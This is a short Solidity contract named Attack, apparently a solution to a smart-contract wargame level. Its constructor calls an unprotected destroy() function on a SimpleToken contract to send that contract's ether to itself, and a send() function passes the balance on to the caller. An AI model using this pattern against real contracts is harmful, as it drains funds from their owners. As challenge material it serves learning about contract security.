// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken{
  function destroy(address) external;
}

contract Attack{
    //to pass this level i've found the address
    //of the contract SimpleToken on the etherscan
    //and passed it as an argument
    constructor(ISimpleToken simple){
        simple.destroy(payable(address(this)));

    }

    //receiving ether 
    receive() external payable { }
    
    //sending remaining ether to msg.sender
    function send()external{
        payable(msg.sender).transfer(address(this).balance);
    }
}